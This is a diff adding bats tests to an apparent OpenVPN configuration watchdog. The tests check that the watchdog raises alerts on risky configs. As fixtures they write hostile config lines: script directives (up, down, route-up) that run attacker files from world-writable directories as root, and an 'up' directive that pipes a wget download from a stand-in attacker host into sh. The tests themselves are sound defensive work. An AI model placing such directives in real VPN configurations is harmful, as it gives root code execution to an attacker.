@@ -143,3 +143,73 @@ seed_benign() {
     [ "${status}" -ne 0 ]
     cap | grep -q '"severity":"alert"'
 }
+
+@test "baseline is chmod 0600 (confidentiality — openvpn config inventory enumerates VPN-event root-exec surface)" {
+    seed_benign
+    run_wd
+    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
+}
+
+@test "INVARIANT (script directive under /var/tmp): writable-root expansion" {
+    seed_benign
+    run_wd
+    printf 'client\ndev tun\nup /var/tmp/.attacker\n' > "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (script directive under /dev/shm): tmpfs writable-root coverage" {
+    seed_benign
+    run_wd
+    printf 'client\ndev tun\nup /dev/shm/.attacker\n' > "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (down script directive — symmetric to up): writable-root → alert" {
+    # OpenVPN has multiple script directives (up + down + client-connect +
+    # route-up + tls-verify + auth-user-pass-verify). All run AS ROOT.
+    seed_benign
+    run_wd
+    printf 'client\ndev tun\ndown /tmp/.attacker\n' > "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (route-up script directive — symmetric to up): writable-root → alert" {
+    seed_benign
+    run_wd
+    printf 'client\ndev tun\nroute-up /tmp/.attacker\n' > "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (wget-pipe-sh in script directive): wget bootstrap → alert" {
+    seed_benign
+    run_wd
+    printf 'client\ndev tun\nup "wget -qO- http://attacker/p | sh"\n' > "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (<tls-crypt> inline material world-readable → alert): inline-key axis coverage symmetric to <key>" {
+    seed_benign
+    run_wd
+    printf 'client\ndev tun\n<tls-crypt>\n-----BEGIN OpenVPN Static key V1-----\n</tls-crypt>\n' > "${CONF}"
+    chmod 0644 "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
+    seed_benign
+    run_wd
+    main_count=$(cap | grep -cE '^-t selfdef-openvpn -- ')
+    [ "${main_count}" = "1" ]
+}
